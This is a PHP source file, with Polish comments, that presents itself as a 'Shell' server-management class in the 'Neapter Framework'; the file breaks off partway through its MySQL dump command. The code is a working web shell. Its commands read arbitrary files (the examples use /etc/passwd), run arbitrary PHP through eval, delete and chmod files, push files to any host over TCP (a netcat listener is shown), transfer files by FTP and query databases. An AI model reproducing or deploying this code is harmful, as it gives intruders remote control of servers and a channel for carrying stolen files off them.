<?php

/**
 * Part of Neapter Framework
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 */

require_once dirname( __FILE__ ) . '/Lib/Arr.php';
require_once dirname( __FILE__ ) . '/Lib/Request.php';
require_once dirname( __FILE__ ) . '/Lib/Form.php';
require_once dirname( __FILE__ ) . '/Lib/Html.php';
require_once dirname( __FILE__ ) . '/Lib/MysqlDumper.php';

/**
 * class Shell - Zarzadzanie serwerem ;)
 *
 * @version    0.2
 *
 * @todo
 *      Edycja pliku
 *      Wysylanie emaili
 *
 * @uses       Request
 * @uses       Form
 * @uses       Html
 */
class Shell
{
	/**
	 * Wersja
	 */
	const VERSION = '0.2 b110531';

	/**
	 * Czas generowania strony
	 *
	 * @access private
	 * @var    float
	 */
	private $fGeneratedIn;

	/**
	 * SafeMode ON / OFF
	 *
	 * @access private
	 * @var    boolean
	 */
	private $bSafeMode;

	/**
	 * Tablica wylaczaonych funkcji
	 *
	 * @access private
	 * @var    array
	 */
	private $aDisableFunctions = array();

	/**
	 * Dzialamy w srodowisku Windows ?
	 *
	 * @access private
	 * @var    boolean
	 */
	private $bWindows;

	/**
	 * Komenda
	 *
	 * @access private
	 * @var    string
	 */
	private $sCmd;

	/**
	 * Lista parametrow
	 *
	 * @access private
	 * @var    array
	 */
	private $aArgv = array();

	/**
	 * Lista opcji
	 *
	 * @access private
	 * @var    array
	 */
	private $aOptv = array();

	/**
	 * Ilosc parametrow
	 *
	 * @access private
	 * @var    integer
	 */
	private $iArgc = 0;

	/**
	 * Ciag jako jeden wielki parametr
	 *
	 * @access private
	 * @var    string
	 */
	private $sArgv;

	/**
	 * Czy funkcja posix_getpwuid istnieje
	 *
	 * @access private
	 * @var    boolean
	 */
	private $bFuncOwnerById = FALSE;

	/**
	 * Czy funkcja posix_getgrgid istnieje
	 *
	 * @access private
	 * @var    boolean
	 */
	private $bFuncGroupById = FALSE;

	/**
	 * Sprawdz linie: 170
	 *
	 * @ignore
	 * @access private
	 * @var    string
	 */
	private $sPhpInfo;

	/**
	 * Konstruktor
	 *
	 * @uses   Request
	 *
	 * @access public
	 * @return void
	 */
	public function __construct()
	{
		/**
		 * Czas generowania strony
		 */
		$this -> fGeneratedIn = microtime( 1 );

		/**
		 * @see Request::init
		 */
		Request::init();

		/**
		 * Czy dzialamy na Windowsie ?
		 */
		$this -> bWindows = ( strncmp( PHP_OS, 'WIN', 3 ) === 0 );

		/**
		 * SafeMode
		 */
		$this -> bSafeMode = (bool) ini_get( 'safe_mode' );

		/**
		 * Czy funkcje sa dostepne
		 */
		$this -> bFuncOwnerById = function_exists( 'posix_getpwuid' );
		$this -> bFuncGroupById = function_exists( 'posix_getgrgid' );

		/**
		 * W zasadzie nic to nie robi, ale za to Netbeans ma problemy z formatowaniem
		 * i podpowiadaniem skladni z tym wlasnie kodem ;), nacisnij ALT + SHIFT + M
		 * to taki FEATURE ;]
		 */
		$sPhpInfo = <<<CONTENT

/phpinfo
CONTENT;

		$this -> sPhpInfo = substr( $sPhpInfo, -7 );

		/**
		 * Jesli SafeMode jest wylaczony
		 */
		if( ! $this -> bSafeMode )
		{
			ini_set( 'display_errors',         0 );
			ini_set( 'max_execution_time',     0 );
			ini_set( 'memory_limit',           '1024M' );
			ini_set( 'default_socket_timeout', 5 );
			ini_set( 'date.timezone',          'Europe/Warsaw' );
		}

		/**
		 * Config
		 */
		error_reporting( 0 );
		ignore_user_abort( 0 );
		date_default_timezone_set( 'Europe/Warsaw' );

		/**
		 * disable_functions
		 */
		if( ( $sDisableFunctions = ini_get( 'disable_functions' ) ) !== '' )
		{
			$aDisableFunctions = explode( ',', $sDisableFunctions );
			array_walk( $aDisableFunctions, create_function( '$sValue', 'return strtolower( trim( $sValue ) );' ) );

			$this -> aDisableFunctions = $aDisableFunctions;
		}
	}

	/**
	 * Pobieranie nazwy uzytkownika po jego ID
	 *
	 * @access private
	 * @param  integer        $iValue ID uzytkownika
	 * @return string|integer         Nazwa uzytkownika / ID uzytkownika
	 */
	private function getOwnerById( $iValue )
	{
		if( $this -> bFuncOwnerById )
		{
			$aUser = posix_getpwuid( $iValue );
			return $aUser['name'];
		}

		return $iValue;
	}

	/**
	 * Pobieranie nazwy grupy po jej ID
	 *
	 * @access private
	 * @param  integer        $iValue ID grupy
	 * @return string|integer         Nazwa grupy / ID grupy
	 */
	private function getGroupById( $iValue )
	{
		if( $this -> bFuncGroupById )
		{
			$aGroup = posix_getgrgid( $iValue );
			return $aGroup['name'];
		}

		return $iValue;
	}

	/**
	 * Pobieranie nazwy hosta i portu
	 *
	 * @access private
	 * @param  integer $sHost Host / Host:port
	 * @return array          Host i port
	 */
	private function getHost( $sHost )
	{
		$iPort = 0;
		if( strpos( $sHost, ':' ) !== FALSE )
		{
			list( $sHost, $iPort ) = explode( ':', $sHost );
		}

		return array( $sHost, (int) $iPort );
	}

	/**
	 * Pobieranie statusu TAK / NIE
	 *
	 * @access private
	 * @param  boolean $bValue    Wartosc
	 * @param  boolean $bNegative Negacja 1, 0 zwroci zielone TAK, 1, 1 zwroci czerwone TAK
	 * @return string             Status
	 */
	private function getStatus( $bValue, $bNegative = FALSE )
	{
		return sprintf( '<span class="%s">%s</span>', ( ( $bNegative ? ! $bValue : $bValue ) ? 'green' : 'red' ), ( $bValue ? 'TAK' : 'NIE' ) );
	}

	/**
	 * Pobieranie menu
	 *
	 * @access private
	 * @return string  Menu w HTMLu
	 */
	private function getMenu()
	{
		return sprintf( 'Wersja PHP: <strong>%s</strong><br />' .
				'SafeMode: %s<br />' .
				'OpenBaseDir: %s<br />' .
				'Serwer Api: <strong>%s</strong><br />' .
				'Serwer: <strong>%s</strong><br />' .
				'Zablokowane funkcje: <strong>%s</strong><br />',

				phpversion(),
				$this -> getStatus( $this -> bSafeMode, 1 ),
				ini_get( 'open_basedir' ),
				php_sapi_name(),
				php_uname(),
				( ( $sDisableFunctions = implode( ',', $this -> aDisableFunctions ) === '' ) ? 'brak' : $sDisableFunctions )
		);
	}

	/**
	 * Komenda - echo
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandEcho()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
echo - Wyświetla tekst

	Użycie:
		echo tekst do wyświetlenia
HELP;
		}

		return htmlspecialchars( $this -> sArgv );
	}

	/**
	 * Komenda - ping
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandPing()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
ping - Odpowiedź "pong"

	Użycie:
		ping
HELP;
		}

		return 'pong';
	}

	/**
	 * Komenda - ls
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandLs()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
ls - Wyświetlanie informacji o plikach i katalogach

	Użycie:
		ls ścieżka_do_katalogu

	Opcje:
		-l  wyświetlanie szczegółowych informacji o plikach i katalogach
		    właściciel, grupa, rozmiar, czas utworzenia

		-R wyświetlanie plików i katalogów rekurencyjnie

	Przykład:
		ls /home/
		ls -l /home/
		ls -lR /home/
HELP;
		}

		$sOutput = NULL;

		/**
		 * Domyslny katalog jezeli nie podano sciezki
		 */
		$sDir = ( ! empty( $this -> sArgv ) ? $this -> sArgv : dirname( __FILE__ ) );

		$bList      = in_array( 'l', $this -> aOptv );
		$bRecursive = in_array( 'R', $this -> aOptv );

		try
		{
			/**
			 * Jezeli chcemy wyswietlic pliki i katalogi rekurencyjnie to uzywamy
			 * obiektu RecursiveDirectoryIterator
			 */
			if( $bRecursive )
			{
				$oDirectory = new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $sDir ), RecursiveIteratorIterator::SELF_FIRST );
			}
			else
			{
				$oDirectory = new DirectoryIterator( $sDir );
			}

			/**
			 * Informacja o komendzie jaka wykonalismy
			 */
			$sOutput .= sprintf( "%s %s\n\n", $this -> sCmd, $this -> sArgv );

			$sFileName = ( $bRecursive ? 'getPathname' : 'getBasename' );

			foreach( $oDirectory as $oFile )
			{
				if( $bList )
				{
					/**
					 * Windows ?
					 */
					if( $this -> bWindows )
					{
						$sOutput .= sprintf( "%s %11d %s %s\n",
							( ( $oFile -> getType() === 'file' ) ? '-' : 'd' ),
							$oFile -> getSize(), date( 'Y-m-d h:i',
								$oFile -> getCTime() ),
							$oFile -> {$sFileName}()
						);
					}
					else
					{
						$sOutput .= sprintf( "%s%s %-10s %-10s %11d %s %s\n",
							( ( $oFile -> getType() === 'file' ) ? '-' : 'd' ),
							substr( sprintf( '%o', $oFile -> getPerms() ), -4 ),
							$this -> getOwnerById( $oFile -> getOwner() ),
							$this -> getGroupById( $oFile -> getGroup() ),
							$oFile -> getSize(), date( 'Y-m-d h:i',
							$oFile -> getCTime() ), $oFile -> {$sFileName}()
						);
					}
				}
				else
				{
					$sOutput .= sprintf( "%s %s\n", ( ( $oFile -> getType() === 'file' ) ? 'fil' : 'dir' ), $oFile -> {$sFileName}() );
				}
			}

			return htmlspecialchars( $sOutput );
		}
		catch( Exception $oException )
		{
			return sprintf( "Nie można otworzyć katalogu \"%s\"\n\nErro: %s", $sDir, $oException -> getMessage()  );
		}
	}

	/**
	 * Komenda - cat
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandCat()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
cat - Wyświetlanie zawartości pliku

	Użycie:
		cat ścieżka_do_pliku

	Przykład:
		cat /etc/passwd
HELP;
		}

		/**
		 * Plik zrodlowy musi istniec
		 */
		if( ! is_file( $this -> sArgv ) )
		{
			return sprintf( 'Plik "%s" nie istnieje', $this -> sArgv );
		}

		return htmlspecialchars( file_get_contents( $this -> sArgv ) );
	}

	/**
	 * Komenda - mkdir
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandMkdir()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
mkdir - Tworzenie katalogu

	Użycie:
		echo katalog [katalog2] [katalog3]
HELP;
		}

		$sOutput = NULL;

		for( $i = 0; $i < $this -> iArgc; $i++ )
		{
			if( ! mkdir( $this -> aArgv[ $i ], 0777, TRUE ) )
			{
				$sOutput .= sprintf( "Katalog \"%s\" <span class=\"red\">nie został utworzony</span>\n", $this -> aArgv[ $i ] );
			}
			else
			{
				$sOutput .= sprintf( "Katalog \"%s\" <span class=\"green\">został utworzony</span>\n", $this -> aArgv[ $i ] );
			}
		}

		return $sOutput;
	}

	/**
	 * Komenda - cp
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandCp()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 2 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
cp, copy - Kopiowanie pliku

	Użycie:
		cp plik_lub_katalog_źródłowy plik_lub_katalog_docelowy
HELP;
		}

		$sOutput = NULL;

		if( ! copy( $this -> aArgv[0], $this -> aArgv[1] ) )
		{
			return sprintf( 'Plik "%s" <span class="red">nie został skopiowany</span> do "%s"', $this -> aArgv[0], $this -> aArgv[1] );
		}

		return sprintf( 'Plik "%s" <span class="green">został skopiowany</span> do "%s"', $this -> aArgv[0], $this -> aArgv[1] );
	}

	/**
	 * Komenda - cp
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandMv()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 2 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
mv, move - Przenoszenie pliku

	Użycie:
		mv plik_lub_katalog_źródłowy plik_lub_katalog_docelowy
HELP;
		}

		$sOutput = NULL;

		if( ! rename( $this -> aArgv[0], $this -> aArgv[1] ) )
		{
			return sprintf( 'Plik "%s" <span class="red">nie został przeniesiony</span> do "%s"', $this -> aArgv[0], $this -> aArgv[1] );
		}

		return sprintf( 'Plik "%s" <span class="green">został przeniesiony</span> do "%s"', $this -> aArgv[0], $this -> aArgv[1] );
	}

	/**
	 * Komenda - remove
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandRemove()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
remove, rm, delete, del - Usuwanie pliku / katalogu. Zawartość katalogu zostanie usunięta rekurencyjnie

	Użycie:
		remove ścieżka_do_katalogu_lub_pliku
HELP;
		}

		$sOutput = NULL;

		/**
		 * Jezeli podana sciezka to plik
		 */
		if( is_file( $this -> sArgv ) )
		{
			if( ! unlink( $this -> sArgv ) )
			{
				return sprintf( 'Plik "%s" <span class="red">nie został usunięty</span>', $this -> sArgv );
			}

			return sprintf( 'Plik "%s" <span class="green">został usunięty</span>', $this -> sArgv );
		}
		/**
		 * Jezeli podana sciezka to katalog
		 */
		if( is_dir( $this -> sArgv ) )
		{
			try
			{
				$oDirectory = new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $this -> sArgv, RecursiveDirectoryIterator::SKIP_DOTS ), RecursiveIteratorIterator::CHILD_FIRST );

				foreach( $oDirectory as $oFile )
				{
					if( $oFile -> isDir() )
					{
						/**
						 * Usuwanie katalogu
						 */
						if( ! rmdir( $oFile -> getPathname() ) )
						{
							$sOutput .= sprintf( "Katalog \"%s\" <span class=\"red\">nie został usunięty</span>\n", $oFile -> getPathname() );
						}
					}
					else
					{
						/**
						 * Usuwanie pliku
						 */
						if( ! unlink( $oFile -> getPathname() ) )
						{
							$sOutput .= sprintf( "Plik    \"%s\" <span class=\"red\">nie został usunięty</span>\n", $oFile -> getPathname() );
						}
					}
				}

				/**
				 * Usuwanie ostatniego katalogu
				 */
				if( ! rmdir( $this -> sArgv ) )
				{
					return $sOutput . sprintf( 'Katalog "%s" <span class="red">nie został usunięty</span>', $this -> sArgv );
				}
			}
			catch( Exception $oException )
			{
				return sprintf( "Nie można otworzyć katalogu \"%s\"\n\nErro: %s", $sDir, $oException -> getMessage()  );
			}

			return sprintf( 'Katalog "%s" <span class="green">został usunięty</span>', $this -> sArgv );
		}

		return sprintf( 'Podana ścieżka "%s" nie istnieje', $this -> sArgv );
	}

	/**
	 * Komenda - chmod
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandChmod()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 2 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
chmod - Zmiana uprawnień dla pliku

	Użycie:
		chmod uprawnienie plik_lub_katalog

	Przykład:
		chmod 777 /tmp/plik
HELP;
		}

		/**
		 * Chmod jest wymagany
		 */
		if( ! ctype_digit( $this -> aArgv[0] ) || strlen( $this -> aArgv[0] ) !== 3 )
		{
			return sprintf( 'Błędny chmod "%d"', $this -> aArgv[0] );
		}

		/**
		 * Plik musi istniec
		 */
		if( ! is_file( $this -> aArgv[1] ) )
		{
			return sprintf( 'Plik "%s" nie istnieje', $this -> aArgv[1] );
		}

		if( chmod( $this -> aArgv[1], $this -> aArgv[0] ) )
		{
			return 'Uprawnienia <span class="green">zostały zmienione</span>';
		}

		return 'Uprawnienia <span class="red">nie zostały zmienione</span>';
	}

	/**
	 * Komenda - bcat
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandBCat()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
bcat, b64 - Wyświetlanie zawartości pliku przy użyciu base64

	Użycie:
		bcat ścieżka_do_pliku

	Przykład:
		bcat /etc/passwd
HELP;
		}

		/**
		 * Plik zrodlowy musi istniec
		 */
		if( ! is_file( $this -> sArgv ) )
		{
			return sprintf( 'Plik "%s" nie istnieje', $this -> sArgv );
		}

		/**
		 * Naglowek Mime i zrodlo pliku w base64
		 */
		$sMime = sprintf( "MIME-Version: 1.0\r\nContent-Type: application/octet-stream; name=\"%s\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"%s\"\r\n\r\n",
			basename( $this -> sArgv ), basename( $this -> sArgv )
		);

		return htmlspecialchars( $sMime . chunk_split( base64_encode( file_get_contents( $this -> sArgv ) ), 130 ) );
	}

	/**
	 * Komenda - eval
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandEval()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
eval, php - Wykonanie kodu PHP

	Użycie:
		eval skrypt_php

	Przykład:
		eval echo md5( 'test' );
HELP;
		}

		ob_start();
		eval( $this -> sArgv );
		$sData = ob_get_contents();
		ob_clean();
		ob_end_flush();

		return htmlspecialchars( $sData );
	}

	/**
	 * Komenda - phpinfo
	 *
	 * @uses   Html
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandPhpInfo()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
phpinfo - Informacje o PHP

	Użycie:
		{$this -> sPhpInfo}
HELP;
		}

		ob_start();
		phpinfo();
		$sData = ob_get_contents();
		ob_clean();
		ob_end_flush();

		/**
		 * Wywalanie zbednych tresci, klasy itp
		 * Licencje kazdy zna
		 */
		$sData = str_replace( array
			(
				' class="e"',
				' class="v"'
			),
			'',
			substr( $sData,
				strpos( $sData, '<div class="center">' ) + 20,
				-( strlen( $sData ) - strrpos( $sData, '<h2>PHP License</h2>' ) )
			)
		);

		/**
		 * logo kazdy widzial, creditsy tez
		 */
		$sData = preg_replace( '~<a href="http://www.php.net/"><img border="0" src="[^"]+" alt="PHP Logo" /></a><h1 class="p">(.+?)</h1>~', '<h1>$1</h1>', $sData );
		$sData = preg_replace( '~<a href=".+?"><img border="0" src=".+?" alt=".+?" /></a>~', NULL, $sData );
		$sData = preg_replace( '~<hr />\s+<h1><a href=".+?">PHP Credits</a></h1>~', NULL, $sData );

		return Html::shrink( $sData );
	}

	/**
	 * Komenda - socketdownload
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandSocketDownload()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 2 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
socketdownload, socketdown, socketget - Pobieranie pliku za pomocą protokołu TCP

	Użycie:
		socketupload host:port ścieżka_do_pliku_gdzie_ma_być_zapisany

	Przykład:
		socketupload localhost:6666 /tmp/plik.txt

	NetCat:
		nc -vv -w 1 -l -p 6666 < plik.txt
HELP;
		}

		/**
		 * Plik zrodlowy musi istniec
		 */
		$aHost = $this -> getHost( $this -> aArgv[0] );

		if( $aHost[1] === 0 )
		{
			return sprintf( 'Błędny host "%s"', $this -> aArgv[0] );
		}

		/**
		 * Polaczenie z hostem
		 */
		if( ! ( $rSock = fsockopen( $aHost[0], $aHost[1] ) ) )
		{
			return htmlspecialchars( sprintf( 'Nie można połączyć się z serwerem "%s"', $this -> aArgv[0] ) );
		}

		/**
		 * File
		 */
		if( ! ( $rFile = fopen( $this -> aArgv[1], 'w' ) ) )
		{
			return htmlspecialchars( sprintf( 'Nie można odczytać pliku "%s"', $this -> aArgv[1] ) );
		}

		while( ! feof( $rSock ) )
		{
			fwrite( $rFile, fread( $rSock, 131072 ) );
		}

		fclose( $rFile );
		fclose( $rSock );

		return htmlspecialchars( sprintf( 'Plik został pobrany i zapisany w "%s"', $this -> aArgv[1] ) );
	}

	/**
	 * Komenda - ftpdownload
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandFtpDownload()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 4 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
ftpdownload, ftpdown, ftpdown - Pobieranie pliku z FTP

	Użycie:
		ftpdownload host:port login@hasło plik_źródłowy plik_docelowy_

	Przykład:
		ftpdownload localhost:6666 test@test /plik.txt /home/usr/plik.txt
HELP;
		}

		$aHost = $this -> getHost( $this -> aArgv[0] );

		if( $aHost[1] === 0 )
		{
			$aHost[1] = 21;
		}

		/**
		 * login@pass
		 */
		list( $sUsername, $sPassword ) = explode( '@', $this -> aArgv[1] );

		/**
		 * Ustanawianie polaczenia
		 */
		if( ! ( $rFtp = ftp_connect( $aHost[0], $aHost[1], 5 ) ) )
		{
			return htmlspecialchars( sprintf( 'Nie można połączyć się z serwerem FTP "%s"', $this -> aArgv[0] ) );
		}

		/**
		 * Autoryzacja
		 */
		if( ! ftp_login( $rFtp, $sUsername, $sPassword ) )
		{
			return htmlspecialchars( sprintf( 'Błędne dane do autoryzacji "%s"', $this -> aArgv[1] ) );
		}

		/**
		 * Zmiana katalogu
		 */
		if( ! ftp_chdir( $rFtp, ( $sDir = str_replace( '\\', '/', dirname( $this -> aArgv[2] ) ) ) ) )
		{
			return htmlspecialchars( sprintf( 'Na FTP nie istnieje katalog "%s"', $sDir ) );
		}

		/**
		 * Pobieranie pliku
		 */
		if( ! ftp_get( $rFtp, $this -> aArgv[3], basename( $this -> aArgv[2] ), FTP_BINARY ) )
		{
			return htmlspecialchars( sprintf( 'Nie można pobrać pliku "%s" z serwera', $this -> aArgv[2] ) );
		}

		ftp_close( $rFtp );

		return htmlspecialchars( sprintf( 'Plik "%s" został pomyślnie pobrany an FTP i zapisany w "%s"', $this -> aArgv[2], $this -> aArgv[3] ) );
	}

	/**
	 * Komenda - download
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandDownload()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
download, down, get - Pobieranie pliku

	Użycie:
		download ścieżka_do_pliku

	Opcje:
		-g pobieranie przy użyciu kompresji GZIP

	Przykład:
		download /etc/passwd
		download -g /etc/passwd
HELP;
		}

		$bGzip = in_array( 'g', in_array( 'R', $this -> aOptv ) );

		/**
		 * Plik zrodlowy musi istniec
		 */
		if( ! is_file( $this -> sArgv ) )
		{
			return sprintf( 'Plik "%s" nie istnieje', $this -> sArgv );
		}

		/**
		 * Kompresja zawartosci strony
		 */
		if( $bGzip )
		{
			ini_set( 'zlib.output_compression', 9 );
		}

		ob_start();

		/**
		 * Naglowki
		 */
		header( 'Cache-Control: must-revalidate, post-check=0, pre-check=0', TRUE );
		header( sprintf( 'Content-Disposition: attachment; filename="%s"', basename( $this -> sArgv ) ), TRUE );
		header( 'Content-Type: application/octet-stream', TRUE );

		if( ( $rFile = fopen( $this -> sArgv, 'r' ) ) !== FALSE )
		{
			if( ! $bGzip )
			{
				header( sprintf( 'Content-Length: %s', filesize( $this -> sArgv ) ), TRUE );
			}

			while( ! feof( $rFile ) )
			{
				echo fread( $rFile, 131072 );
				ob_flush();
				flush();
			}
		}

		ob_end_flush();
		exit ;
	}

	/**
	 * Komenda - socketupload
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandSocketUpload()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 2 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
socketupload, socketup, socketput - Wysyłanie pliku za pomocą protokołu TCP

	Użycie:
		socketupload host:port ścieżka_do_pliku

	Przykład:
		socketupload localhost:6666 /etc/passwd

	NetCat:
		nc -vv -l -p 6666
HELP;
		}

		$aHost = $this -> getHost( $this -> aArgv[0] );

		/**
		 * Port jest wymagany
		 */
		if( $aHost[1] === 0 )
		{
			return sprintf( 'Błędny host "%s"', $this -> aArgv[0] );
		}

		/**
		 * Plik zrodlowy musi istniec
		 */
		if( ! is_file( $this -> aArgv[1] ) )
		{
			return sprintf( 'Plik "%s" nie istnieje', $this -> aArgv[1] );
		}

		/**
		 * Polaczenie z hostem
		 */
		if( ! ( $rSock = fsockopen( $aHost[0], $aHost[1] ) ) )
		{
			return sprintf( 'Nie można połączyć się z serwerem "%s"', $this -> aArgv[0] );
		}

		/**
		 * File
		 */
		if( ! ( $rFile = fopen( $this -> aArgv[1], 'r' ) ) )
		{
			return sprintf( 'Nie można odczytać pliku "%s"', $this -> aArgv[1] );
		}

		while( ! feof( $rFile ) )
		{
			fwrite( $rSock, fread( $rFile, 131072 ) );
		}

		fclose( $rFile );
		fclose( $rSock );

		return 'Plik został przesłany';
	}

	/**
	 * Komenda - ftpupload
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandFtpUpload()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 4 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
ftpupload, ftpup, ftpput - Wysyłanie pliku na FTP

	Użycie:
		ftpupload host:port login@hasło plik_źródłowy ścieżka_docelowa

	Przykład:
		ftpupload localhost:6666 test@test /home/usr/plik.txt /
HELP;
		}

		/**
		 * Plik zrodlowy musi istniec
		 */
		if( ! is_file( $this -> aArgv[2] ) )
		{
			return htmlspecialchars( sprintf( 'Plik "%s" nie istnieje', $this -> aArgv[2] ) );
		}

		$aHost = $this -> getHost( $this -> aArgv[0] );

		if( $aHost[1] === 0 )
		{
			$aHost[1] = 21;
		}

		/**
		 * login@pass
		 */
		list( $sUsername, $sPassword ) = explode( '@', $this -> aArgv[1] );

		/**
		 * Ustanawianie polaczenia
		 */
		if( ! ( $rFtp = ftp_connect( $aHost[0], $aHost[1], 5 ) ) )
		{
			return htmlspecialchars( sprintf( 'Nie można połączyć się z serwerem FTP "%s"', $this -> aArgv[0] ) );
		}

		/**
		 * Autoryzacja
		 */
		if( ! ftp_login( $rFtp, $sUsername, $sPassword ) )
		{
			return htmlspecialchars( sprintf( 'Błędne dane do autoryzacji "%s"', $this -> aArgv[1] ) );
		}

		/**
		 * Zmiana katalogu
		 */
		if( ! ftp_chdir( $rFtp, $this -> aArgv[3] ) )
		{
			return htmlspecialchars( sprintf( 'Na FTP nie istnieje katalog "%s"', $this -> aArgv[2] ) );
		}

		/**
		 * Wrzucanie pliku
		 */
		if( ! ftp_put( $rFtp, basename( $this -> aArgv[2] ), $this -> aArgv[2], FTP_BINARY ) )
		{
			return htmlspecialchars( sprintf( 'Nie można wgrać pliku "%s" na serwer', $this -> aArgv[2] ) );
		}

		ftp_close( $rFtp );

		return htmlspecialchars( sprintf( 'Plik "%s" został pomyślnie wgrany an FTP', $this -> aArgv[2] ) );
	}

	/**
	 * Komenda - mysql
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandMysql()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 4 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
mysql - Połączenie z bazą MySQL

	Użycie:
		mysql host:port login@hasło nazwa_bazy komenda

	Przykład:
		mysql localhost:3306 test@test mysql "SELECT 1"
HELP;
		}

		$aHost = $this -> getHost( $this -> aArgv[0] );

		/**
		 * Domyslny port to 3306
		 */
		if( $aHost[1] === 0 )
		{
			$aHost[1] = 3306;
		}

		/**
		 * login@pass
		 */
		list( $sUsername, $sPassword ) = explode( '@', $this -> aArgv[1], 2 );

		/**
		 * PDO jest wymagane
		 */
		if( ! extension_loaded( 'pdo' ) )
		{
			return 'Brak rozszerzenia PDO';
		}

		try
		{
			/**
			 * Polaczenie do bazy
			 */
			$oPdo = new PDO( sprintf( 'mysql:host=%s;port=%d;dbname=%s', $aHost[0], $aHost[1], $this -> aArgv[2] ), $sUsername, $sPassword );

			$oSql = $oPdo -> query( $this -> aArgv[3] );

			$aData = $oSql -> fetchAll( PDO::FETCH_ASSOC );

			$oSql -> closeCursor();

			if( $aData === array() )
			{
				return 'Brak wyników';
			}

			/**
			 * $aDataLength przechowuje dlugosc najdluzszego ciagu w danej kolumnie
			 */
			$aDataLength = $aData[0];

			/**
			 * Domyslnie dlugosc pola to dlugosc kolumny
			 */
			array_walk( $aDataLength, create_function( '& $sVal, $sKey', '$sVal = strlen( $sKey );' ) );

			/**
			 * Obliczanie dlugosci ciagu
			 */
			foreach( $aData as $aRow )
			{
				foreach( $aRow as $sColumn => $sValue )
				{
					if( ( $iLength = strlen( $sValue ) ) > $aDataLength[ $sColumn ] )
					{
						$aDataLength[ $sColumn ] = $iLength;
					}
				}
			}

			$sOutput = NULL;

			$sLines = str_repeat( '-', array_sum( $aDataLength ) + 1 + 3 * count( $aDataLength ) ) . "\n";

			$sOutput .= $sLines;
			/**
			 * Nazwy kolumn
			 */
			foreach( $aDataLength as $sColumn => $sValue )
			{
				$sOutput .= '| ' . str_pad( $sColumn, $aDataLength[ $sColumn ], ' ', STR_PAD_RIGHT ) . ' ';
			}
			$sOutput .= "|\n" . $sLines;

			/**
			 * Dane
			 */
			foreach( $aData as $aRow )
			{
				foreach( $aRow as $sColumn => $sValue )
				{
					$sOutput .= '| ' . str_pad( $sValue, $aDataLength[ $sColumn ], ' ', STR_PAD_RIGHT ) . ' ';
				}
				$sOutput .= "|\n";
			}

			return htmlspecialchars( $sOutput . $sLines );
		}
		/**
		 * Wyjatek
		 */
		catch( PDOException $oException )
		{
			return sprintf( 'Wystąpił błąd: %s', $oException -> getMessage() );
		}
	}

	/**
	 * Komenda - mysqldumper
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandMysqlDump()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc < 3 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
mysqldump, mysqldumper, mysqlbackup, dumpdb - Kopia bazy danych MySQL

	Użycie:
		mysqldump host:port login@hasło nazwa_bazy [tabela1] [tabela2]

	Przykład:
		mysqldump localhost:3306 test@test mysql users
HELP;
		}

		$aHost = $this -> getHost( $this -> aArgv[0] );

		/**
		 * Domyslny port to 3306
		 */
		if( $aHost[1] === 0 )
		{
